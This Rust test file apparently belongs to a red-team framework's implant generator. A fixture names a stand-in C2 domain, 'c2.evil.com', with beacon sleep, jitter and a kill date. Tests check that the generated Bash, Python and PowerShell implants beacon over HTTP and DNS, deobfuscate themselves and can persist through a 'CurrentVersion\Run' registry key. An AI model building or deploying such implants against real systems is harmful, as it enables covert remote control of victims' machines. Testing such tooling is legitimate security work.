use aegis_orchestrator::implant_generator::*;

fn default_config() -> ImplantConfig {
    ImplantConfig {
        platform: ImplantPlatform::Bash,
        c2_servers: vec!["https://cdn.example.com/api".to_string()],
        dns_domain: "c2.evil.com".to_string(),
        sleep_secs: 30,
        jitter_pct: 0.15,
        kill_date: Some("2025-12-31".to_string()),
        implant_id: "imp-test-42".to_string(),
        encryption_key_hex: "deadbeefcafebabe1234567890abcdef".to_string(),
        registry_persistence: false,
    }
}

#[test]
fn test_bash_generation() {
    let config = default_config();
    let implant = generate_implant(&config);
    assert_eq!(implant.platform, ImplantPlatform::Bash);
    assert!(implant.source_code.contains("#!/bin/bash"));
    assert!(implant.source_code.contains("curl"));
    assert!(implant.source_code.contains("dig"));
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "{issues:?}");
}

#[test]
fn test_python_generation() {
    let mut config = default_config();
    config.platform = ImplantPlatform::Python;
    let implant = generate_implant(&config);
    assert!(implant.source_code.contains("urllib"));
    assert!(implant.source_code.contains("deobf"));
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "{issues:?}");
}

#[test]
fn test_powershell_generation() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    let implant = generate_implant(&config);
    assert!(implant.source_code.contains("Invoke-WebRequest"));
    assert!(implant.source_code.contains("Resolve-DnsName"));
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "{issues:?}");
}

#[test]
fn test_powershell_with_persistence() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    config.registry_persistence = true;
    let implant = generate_implant(&config);
    assert!(implant.source_code.contains("CurrentVersion\\Run"));
}

#[test]
fn test_generate_all() {
    let config = default_config();
    let all = generate_all_implants(&config);
    assert_eq!(all.len(), 3);
    for implant in &all {
        let mut cfg = config.clone();
        cfg.platform = implant.platform;
        let issues = validate_implant(implant, &cfg);
        assert!(issues.is_empty(), "{}: {issues:?}", implant.platform);
    }
}
